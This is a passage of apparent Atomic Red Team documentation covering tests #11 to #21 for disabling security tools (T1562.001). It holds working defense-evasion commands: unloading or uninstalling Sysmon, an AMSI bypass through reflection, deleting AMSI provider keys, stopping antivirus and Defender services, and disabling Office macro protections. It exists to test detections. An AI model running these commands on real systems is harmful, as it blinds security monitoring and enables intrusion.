<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>if (-not (cmd.exe /c &quot;where.exe Sysmon.exe 2&gt; nul | findstr Sysmon 2&gt; nul&quot;) -or (Test-Path &quot;PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe&quot;)) { exit 0 } else { exit 1 }

</pre></div>
</div>
</section>
<section id="id14">
<h5>Get Prereq Commands:<a class="headerlink" href="#id14" title="Permalink to this heading">#</a></h5>
<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>New-Item -Type Directory &quot;PathToAtomicsFolder\..\ExternalPayloads\&quot; -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest &quot;https://download.sysinternals.com/files/Sysmon.zip&quot; -OutFile &quot;PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip&quot;
Expand-Archive &quot;PathToAtomicsFolder\..\ExternalPayloads\Sysmon.zip&quot; &quot;PathToAtomicsFolder\..\ExternalPayloads\Sysmon&quot; -Force

</pre></div>
</div>
</section>
<section id="description-sysmon-must-be-installed">
<h5>Description: sysmon must be Installed<a class="headerlink" href="#description-sysmon-must-be-installed" title="Permalink to this heading">#</a></h5>
</section>
<section id="id15">
<h5>Check Prereq Commands:<a class="headerlink" href="#id15" title="Permalink to this heading">#</a></h5>
<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>if(sc.exe query sysmon | findstr sysmon) { exit 0 } else { exit 1 }

</pre></div>
</div>
</section>
<section id="id16">
<h5>Get Prereq Commands:<a class="headerlink" href="#id16" title="Permalink to this heading">#</a></h5>
<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>if(cmd.exe /c &quot;where.exe Sysmon.exe 2&gt; nul | findstr Sysmon 2&gt; nul&quot;) { C:\Windows\Sysmon.exe -accepteula -i } else
{ &amp; &quot;PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe&quot; -accepteula -i}

</pre></div>
</div>
</section>
<section id="description-sysmon-filter-must-be-loaded">
<h5>Description: sysmon filter must be loaded<a class="headerlink" href="#description-sysmon-filter-must-be-loaded" title="Permalink to this heading">#</a></h5>
</section>
<section id="id17">
<h5>Check Prereq Commands:<a class="headerlink" href="#id17" title="Permalink to this heading">#</a></h5>
<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>if(fltmc.exe filters | findstr SysmonDrv) { exit 0 } else { exit 1 }

</pre></div>
</div>
</section>
<section id="id18">
<h5>Get Prereq Commands:<a class="headerlink" href="#id18" title="Permalink to this heading">#</a></h5>
<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>if(Test-Path &quot;PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe&quot;){
  &amp; &quot;PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe&quot; -u
  &amp; &quot;PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe&quot; -accepteula -i
}else{
  sysmon -u
  sysmon -accepteula -i
}

</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">11</span> <span class="n">-GetPreReqs</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="attack-commands-run-with-command-prompt">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this heading">#</a></h4>
<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>fltmc.exe unload SysmonDrv
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">11</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="id19">
<h4>Cleanup:<a class="headerlink" href="#id19" title="Permalink to this heading">#</a></h4>
<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>sysmon -u -i &gt; nul 2&gt;&amp;1
sysmon -i -accepteula -i &gt; nul 2&gt;&amp;1
&quot;PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe&quot; -u &gt; nul 2&gt;&amp;1
&quot;PathToAtomicsFolder\..\ExternalPayloads\Sysmon\Sysmon.exe&quot; -accepteula -i &gt; nul 2&gt;&amp;1
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">11</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-12-uninstall-sysmon">
<h3>Atomic Test #12 - Uninstall Sysmon<a class="headerlink" href="#atomic-test-12-uninstall-sysmon" title="Permalink to this heading">#</a></h3>
<p>Uninstall Sysinternals Sysmon for Defense Evasion</p>
<p><strong>Supported Platforms:</strong> windows</p>
<p>Elevation Required (e.g. root or admin)</p>
<section id="id20">
<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id20" title="Permalink to this heading">#</a></h4>
<section id="description-sysmon-executable-must-be-available">
<h5>Description: Sysmon executable must be available<a class="headerlink" href="#description-sysmon-executable-must-be-available" title="Permalink to this heading">#</a></h5>
</section>
<section id="id21">
<h5>Check Prereq Commands:<a class="headerlink" href="#id21" title="Permalink to this heading">#</a></h5>
<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>if(cmd /c where sysmon) {exit 0} else {exit 1}

</pre></div>
</div>
</section>
<section id="id22">
<h5>Get Prereq Commands:<a class="headerlink" href="#id22" title="Permalink to this heading">#</a></h5>
<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>$parentpath = Split-Path &quot;PathToAtomicsFolder\T1562.001\bin\sysmon.exe&quot;; $zippath = &quot;$parentpath\Sysmon.zip&quot;
New-Item -ItemType Directory $parentpath -Force | Out-Null
Invoke-WebRequest &quot;https://download.sysinternals.com/files/Sysmon.zip&quot; -OutFile &quot;$zippath&quot;
Expand-Archive $zippath $parentpath -Force; Remove-Item $zippath
if(-not ($Env:Path).contains($parentpath)){$Env:Path += &quot;;$parentpath&quot;}

</pre></div>
</div>
</section>
<section id="id23">
<h5>Description: Sysmon must be installed<a class="headerlink" href="#id23" title="Permalink to this heading">#</a></h5>
</section>
<section id="id24">
<h5>Check Prereq Commands:<a class="headerlink" href="#id24" title="Permalink to this heading">#</a></h5>
<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>if(cmd /c sc query sysmon) { exit 0} else { exit 1}

</pre></div>
</div>
</section>
<section id="id25">
<h5>Get Prereq Commands:<a class="headerlink" href="#id25" title="Permalink to this heading">#</a></h5>
<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>cmd /c sysmon -i -accepteula

</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">12</span> <span class="n">-GetPreReqs</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="id26">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id26" title="Permalink to this heading">#</a></h4>
<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>sysmon -u
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">12</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="id27">
<h4>Cleanup:<a class="headerlink" href="#id27" title="Permalink to this heading">#</a></h4>
<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>sysmon -i -accepteula &gt;nul 2&gt;&amp;1
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">12</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-13-amsi-bypass-amsi-initfailedany-easy-way-to-bypass-amsi-inspection-is-it-patch-the-dll-in-memory-setting-the-amsiinitfailed-function-to-true">
<h3>Atomic Test #13 - AMSI Bypass - AMSI InitFailedAny easy way to bypass AMSI inspection is it patch the dll in memory setting the “amsiInitFailed” function to true.<a class="headerlink" href="#atomic-test-13-amsi-bypass-amsi-initfailedany-easy-way-to-bypass-amsi-inspection-is-it-patch-the-dll-in-memory-setting-the-amsiinitfailed-function-to-true" title="Permalink to this heading">#</a></h3>
<p>Upon execution, no output is displayed.</p>
<p><a class="reference external" href="https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/">https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/</a>
<strong>Supported Platforms:</strong> windows#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></p>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="no">[Ref]</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s1">&#39;System.Management.Automation.AmsiUtils&#39;</span><span class="p">).</span><span class="n">GetField</span><span class="p">(</span><span class="s1">&#39;amsiInitFailed&#39;</span><span class="p">,</span><span class="s1">&#39;NonPublic,Static&#39;</span><span class="p">).</span><span class="n">SetValue</span><span class="p">(</span><span class="nv">$null</span><span class="p">,</span><span class="nv">$true</span><span class="p">)</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">13</span>
</pre></div>
</div>
</div>
</div>
<section id="id28">
<h4>Cleanup:<a class="headerlink" href="#id28" title="Permalink to this heading">#</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="no">[Ref]</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s1">&#39;System.Management.Automation.AmsiUtils&#39;</span><span class="p">).</span><span class="n">GetField</span><span class="p">(</span><span class="s1">&#39;amsiInitFailed&#39;</span><span class="p">,</span><span class="s1">&#39;NonPublic,Static&#39;</span><span class="p">).</span><span class="n">SetValue</span><span class="p">(</span><span class="nv">$null</span><span class="p">,</span><span class="nv">$false</span><span class="p">)</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">13</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-14-amsi-bypass-remove-amsi-provider-reg-keywith-administrative-rights-an-adversary-can-remove-the-amsi-provider-registry-key-in-hklm-software-microsoft-amsi-to-disable-amsi-inspection">
<h3>Atomic Test #14 - AMSI Bypass - Remove AMSI Provider Reg KeyWith administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\Software\Microsoft\AMSI to disable AMSI inspection.<a class="headerlink" href="#atomic-test-14-amsi-bypass-remove-amsi-provider-reg-keywith-administrative-rights-an-adversary-can-remove-the-amsi-provider-registry-key-in-hklm-software-microsoft-amsi-to-disable-amsi-inspection" title="Permalink to this heading">#</a></h3>
<p>This test removes the Windows Defender provider registry key. Upon execution, no output is displayed.
Open Registry Editor and navigate to “HKLM:\SOFTWARE\Microsoft\AMSI\Providers” to verify that it is gone.
<strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></p>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Remove-Item</span> <span class="n">-Path</span> <span class="s2">&quot;HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}&quot;</span> <span class="n">-Recurse</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">14</span>
</pre></div>
</div>
</div>
</div>
<section id="id29">
<h4>Cleanup:<a class="headerlink" href="#id29" title="Permalink to this heading">#</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="n">-Path</span> <span class="s2">&quot;HKLM:\SOFTWARE\Microsoft\AMSI\Providers&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;{2781761E-28E0-4109-99FE-B9D127C57AFE}&quot;</span> <span class="n">-ErrorAction</span> <span class="n">Ignore</span> <span class="p">|</span> <span class="nb">Out-Null</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">14</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-15-disable-arbitrary-security-windows-servicewith-administrative-rights-an-adversary-can-disable-windows-services-related-to-security-products-this-test-requires-mcafeedlpagentservice-to-be-installed">
<h3>Atomic Test #15 - Disable Arbitrary Security Windows ServiceWith administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.<a class="headerlink" href="#atomic-test-15-disable-arbitrary-security-windows-servicewith-administrative-rights-an-adversary-can-disable-windows-services-related-to-security-products-this-test-requires-mcafeedlpagentservice-to-be-installed" title="Permalink to this heading">#</a></h3>
<p>Change the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service.
To verify that the service has stopped, run “sc query McAfeeDLPAgentService”
<strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code></p>
<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>net.exe stop McAfeeDLPAgentService
sc.exe config McAfeeDLPAgentService start= disabled
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">15</span>
</pre></div>
</div>
</div>
</div>
<section id="id30">
<h4>Cleanup:<a class="headerlink" href="#id30" title="Permalink to this heading">#</a></h4>
<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>sc.exe config McAfeeDLPAgentService start= auto &gt;nul 2&gt;&amp;1
net.exe start McAfeeDLPAgentService &gt;nul 2&gt;&amp;1
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">15</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-16-tamper-with-windows-defender-atp-powershellattempting-to-disable-scheduled-scanning-and-other-parts-of-windows-defender-atp-upon-execution-virus-and-threat-protection-will-show-as-disabled">
<h3>Atomic Test #16 - Tamper with Windows Defender ATP PowerShellAttempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled<a class="headerlink" href="#atomic-test-16-tamper-with-windows-defender-atp-powershellattempting-to-disable-scheduled-scanning-and-other-parts-of-windows-defender-atp-upon-execution-virus-and-threat-protection-will-show-as-disabled" title="Permalink to this heading">#</a></h3>
<p>in Windows settings.
<strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></p>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Set-MpPreference</span> <span class="n">-DisableRealtimeMonitoring</span> <span class="n">1</span>
<span class="nb">Set-MpPreference</span> <span class="n">-DisableBehaviorMonitoring</span> <span class="n">1</span>
<span class="nb">Set-MpPreference</span> <span class="n">-DisableScriptScanning</span> <span class="n">1</span>
<span class="nb">Set-MpPreference</span> <span class="n">-DisableBlockAtFirstSeen</span> <span class="n">1</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">16</span>
</pre></div>
</div>
</div>
</div>
<section id="id31">
<h4>Cleanup:<a class="headerlink" href="#id31" title="Permalink to this heading">#</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Set-MpPreference</span> <span class="n">-DisableRealtimeMonitoring</span> <span class="n">0</span>
<span class="nb">Set-MpPreference</span> <span class="n">-DisableBehaviorMonitoring</span> <span class="n">0</span>
<span class="nb">Set-MpPreference</span> <span class="n">-DisableScriptScanning</span> <span class="n">0</span>
<span class="nb">Set-MpPreference</span> <span class="n">-DisableBlockAtFirstSeen</span> <span class="n">0</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">16</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-17-tamper-with-windows-defender-command-promptattempting-to-disable-scheduled-scanning-and-other-parts-of-windows-defender-atp-these-commands-must-be-run-as-system-so-they-still-fail-as-administrator">
<h3>Atomic Test #17 - Tamper with Windows Defender Command PromptAttempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.<a class="headerlink" href="#atomic-test-17-tamper-with-windows-defender-command-promptattempting-to-disable-scheduled-scanning-and-other-parts-of-windows-defender-atp-these-commands-must-be-run-as-system-so-they-still-fail-as-administrator" title="Permalink to this heading">#</a></h3>
<p>However, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on. Upon execution, “Access Denied”
will be displayed twice and the WinDefend service status will be displayed.
<strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code></p>
<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>sc stop WinDefend
sc config WinDefend start=disabled
sc query WinDefend
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">17</span>
</pre></div>
</div>
</div>
</div>
<section id="id32">
<h4>Cleanup:<a class="headerlink" href="#id32" title="Permalink to this heading">#</a></h4>
<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>sc start WinDefend &gt;nul 2&gt;&amp;1
sc config WinDefend start=enabled &gt;nul 2&gt;&amp;1
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">17</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-18-tamper-with-windows-defender-registrydisable-windows-defender-from-starting-after-a-reboot-upen-execution-if-the-computer-is-rebooted-the-entire-virus-and-threat-protection-window-in-settings-will-be">
<h3>Atomic Test #18 - Tamper with Windows Defender RegistryDisable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be<a class="headerlink" href="#atomic-test-18-tamper-with-windows-defender-registrydisable-windows-defender-from-starting-after-a-reboot-upen-execution-if-the-computer-is-rebooted-the-entire-virus-and-threat-protection-window-in-settings-will-be" title="Permalink to this heading">#</a></h3>
<p>grayed out and have no info.
<strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></p>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> <span class="n">-Name</span> <span class="n">DisableAntiSpyware</span> <span class="n">-Value</span> <span class="n">1</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">18</span>
</pre></div>
</div>
</div>
</div>
<section id="id33">
<h4>Cleanup:<a class="headerlink" href="#id33" title="Permalink to this heading">#</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Set-ItemProperty</span> <span class="s2">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> <span class="n">-Name</span> <span class="n">DisableAntiSpyware</span> <span class="n">-Value</span> <span class="n">0</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">18</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-19-disable-microsoft-office-security-featuresgorgon-group-may-disable-office-security-features-so-that-their-code-can-run-upon-execution-an-external-document-will-not">
<h3>Atomic Test #19 - Disable Microsoft Office Security FeaturesGorgon group may disable Office security features so that their code can run. Upon execution, an external document will not<a class="headerlink" href="#atomic-test-19-disable-microsoft-office-security-featuresgorgon-group-may-disable-office-security-features-so-that-their-code-can-run-upon-execution-an-external-document-will-not" title="Permalink to this heading">#</a></h3>
<p>show any warning before editing the document.</p>
<p><a class="reference external" href="https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/">https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/</a>
<strong>Supported Platforms:</strong> windows#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></p>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="n">-Path</span> <span class="s2">&quot;HKCU:\Software\Microsoft\Office\16.0\Excel&quot;</span>
<span class="nb">New-Item</span> <span class="n">-Path</span> <span class="s2">&quot;HKCU:\Software\Microsoft\Office\16.0\Excel\Security&quot;</span>
<span class="nb">New-Item</span> <span class="n">-Path</span> <span class="s2">&quot;HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView&quot;</span>
<span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="s2">&quot;HKCU:\Software\Microsoft\Office\16.0\Excel\Security&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;VBAWarnings&quot;</span> <span class="n">-Value</span> <span class="s2">&quot;1&quot;</span> <span class="n">-PropertyType</span> <span class="s2">&quot;Dword&quot;</span>
<span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="s2">&quot;HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableInternetFilesInPV&quot;</span> <span class="n">-Value</span> <span class="s2">&quot;1&quot;</span> <span class="n">-PropertyType</span> <span class="s2">&quot;Dword&quot;</span>
<span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="s2">&quot;HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableUnsafeLocationsInPV&quot;</span> <span class="n">-Value</span> <span class="s2">&quot;1&quot;</span> <span class="n">-PropertyType</span> <span class="s2">&quot;Dword&quot;</span>
<span class="nb">New-ItemProperty</span> <span class="n">-Path</span> <span class="s2">&quot;HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;DisableAttachementsInPV&quot;</span> <span class="n">-Value</span> <span class="s2">&quot;1&quot;</span> <span class="n">-PropertyType</span> <span class="s2">&quot;Dword&quot;</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">19</span>
</pre></div>
</div>
</div>
</div>
<section id="id34">
<h4>Cleanup:<a class="headerlink" href="#id34" title="Permalink to this heading">#</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Remove-ItemProperty</span> <span class="n">-Path</span> <span class="s2">&quot;HKCU:\Software\Microsoft\Office\16.0\Excel\Security&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;VBAWarnings&quot;</span> <span class="n">-ErrorAction</span> <span class="n">Ignore</span> <span class="p">|</span> <span class="nb">Out-Null</span>
<span class="nb">Remove-Item</span> <span class="n">-Path</span> <span class="s2">&quot;HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView&quot;</span> <span class="n">-ErrorAction</span> <span class="n">Ignore</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">19</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-20-remove-windows-defender-definition-filesremoving-definition-files-would-cause-atp-to-not-fire-for-antimalware-check-mpcmdrun-exe-man-page-for-info-on-all-arguments">
<h3>Atomic Test #20 - Remove Windows Defender Definition FilesRemoving definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.<a class="headerlink" href="#atomic-test-20-remove-windows-defender-definition-filesremoving-definition-files-would-cause-atp-to-not-fire-for-antimalware-check-mpcmdrun-exe-man-page-for-info-on-all-arguments" title="Permalink to this heading">#</a></h3>
<p>On later viersions of windows (1909+) this command fails even with admin due to inusfficient privelages. On older versions of windows the
command will say completed.</p>
<p><a class="reference external" href="https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/">https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/</a>
<strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code></p>
<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>&quot;C:\Program Files\Windows Defender\MpCmdRun.exe&quot; -RemoveDefinitions -All
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">20</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="atomic-test-21-stop-and-remove-arbitrary-security-windows-servicebeginning-with-powershell-6-0-the-stop-service-cmdlet-sends-a-stop-message-to-the-windows-service-controller-for-each-of-the-specified-services-the-remove-service-cmdlet-removes-a-windows-service-in-the-registry-and-in-the-service-database">
<h3>Atomic Test #21 - Stop and Remove Arbitrary Security Windows ServiceBeginning with Powershell 6.0, the Stop-Service cmdlet sends a stop message to the Windows Service Controller for each of the specified services. The Remove-Service cmdlet removes a Windows service in the registry and in the service database.<a class="headerlink" href="#atomic-test-21-stop-and-remove-arbitrary-security-windows-servicebeginning-with-powershell-6-0-the-stop-service-cmdlet-sends-a-stop-message-to-the-windows-service-controller-for-each-of-the-specified-services-the-remove-service-cmdlet-removes-a-windows-service-in-the-registry-and-in-the-service-database" title="Permalink to this heading">#</a></h3>
<p><strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></p>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Stop-Service</span> <span class="n">-Name</span> <span class="n">McAfeeDLPAgentService</span>
